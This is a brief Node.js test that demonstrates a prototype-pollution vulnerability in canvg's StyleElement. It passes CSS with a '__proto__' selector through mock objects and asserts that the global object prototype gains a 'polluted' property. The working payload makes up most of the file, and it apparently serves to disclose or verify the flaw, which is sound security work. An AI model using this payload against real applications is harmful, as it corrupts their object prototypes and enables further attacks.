const { test } = require("node:test");
const { equal } = require("node:assert");

test("Vulnerable to Prototype Pollution", async () => {
  const { StyleElement } = require("canvg");

  equal({}.polluted, undefined);

  // Attacker-controlled CSS input
  const maliciousCSS = `
 __proto__ { polluted: "Yes, polluted!"; }
 `;

  // Creating a mock document object
  const fakeDocument = {
    styles: {},
    stylesSpecificity: {},
    addEventListener: () => {},
    createElement: () => ({ style: {} }),
    appendChild: () => {},
  };

  // Creating a mock node object
  const fakeNode = {
    childNodes: [
      {
        textContent: maliciousCSS,
      },
    ],
  };

  // Instantiating StyleElement to simulate the attack
  const se = new StyleElement(fakeDocument, fakeNode);

  equal(typeof {}.polluted, "object");
});
